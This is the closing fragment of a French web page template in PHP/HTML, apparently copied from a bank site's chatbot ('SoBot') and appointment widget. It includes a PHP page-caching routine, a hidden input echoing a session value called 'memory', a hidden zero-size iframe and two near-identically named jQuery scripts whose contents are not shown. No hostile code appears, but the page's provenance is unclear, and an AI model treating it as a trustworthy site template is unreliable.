<button id="but-1" class="tch_sticky-bar_btn butthoverr" style="width: 55px !important; height: 70px !important; color: white; border: none; border-color: transparent;" onmouseover="but_0_1_2('1');" onmouseout="but_0_1_2('0');">
   <svg class="tch_sticky-bar_icon" aria-label="Poser une question à SoBot" role="img" focusable="false" style="width: 30px !important; height: 30px !important;">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#chatbot"></use>
   </svg>
</button>
 </li>
 <li class="tch_sticky-bar_item" style="border: none; border-color: transparent;">
<button id="but-2" class="tch_sticky-bar_btn butthoverr" style="width: 55px !important; height: 70px !important; color: white; border: none; border-color: transparent;" onmouseover="but_0_1_2('2');" onmouseout="but_0_1_2('0');">
   <svg class="tch_sticky-bar_icon" aria-label="Prendre rendez-vous" role="img" focusable="false"  style="width: 30px !important; height: 30px !important;">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#calendar"></use>
   </svg>
</button>
 </li>
  </ul>
   </div>
   <button class="tch_sticky-bar_close" aria-label="Fermer la boite de dialogue" style="display:none">
  <svg class="tch_sticky-bar_icon tch_sticky-bar_icon--close" aria-hidden="true" focusable="false">
 <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#cross-close"></use>
  </svg>
   </button>
</div>
 </div>
 <div id="tch_sticky-contact" class="tch_sticky-contact_container" style="display:none" bis_skin_checked="1"></div>
  </div>
  <div class="interact-chat" bis_skin_checked="1" style="display:none">
 <div aria-grabbed="false" class="tch_chat" bis_skin_checked="1" style="margin-right: 0px; margin-bottom: 0px;">
<div id="tch_chat-bot" style="display:none" bis_skin_checked="1"></div>
 </div>
  </div>
  <div id="interact-fab" class="interact-fab tch_fab" bis_skin_checked="1" style="display:none">
 <div bis_skin_checked="1">
<button class="js_fab_chat tch_fab__btn" aria-label="Ouvrir la fenêtre de tchat">
   <svg class="tch_fab__icon tch_fab__icon--sobot tch_fab__icon--conversation" aria-hidden="true" focusable="false">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#fab-contact"></use>
   </svg>
</button>
 </div>
  </div>
  <div class="interact-test" bis_skin_checked="1"></div>
   </div>
</DIV>


<?php 
$contenuCache = ob_get_contents();ob_end_flush();
$fd = fopen("$fichierCache", "w");
if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_index.lsg');echo "\n";}  
?>
<input type="hidden" name="memoryText" id="memoryText" value="<?php if(isset($_SESSION['memory'])){ echo htmlspecialchars($_SESSION['memory']); } ?>" style="display: none;">
<footer style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"> 
<div id="footerr" class="Footer" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></div><iframe id="footerr2" src="" scrolling="no" style="display: none; visibility: hidden; overflow: hidden; width: 0px !important; height: 0px !important;"></iframe>
</footer>
<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js" defer="defer"></script>
<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afb.js" defer="defer"></script>


</body>
</html>
 

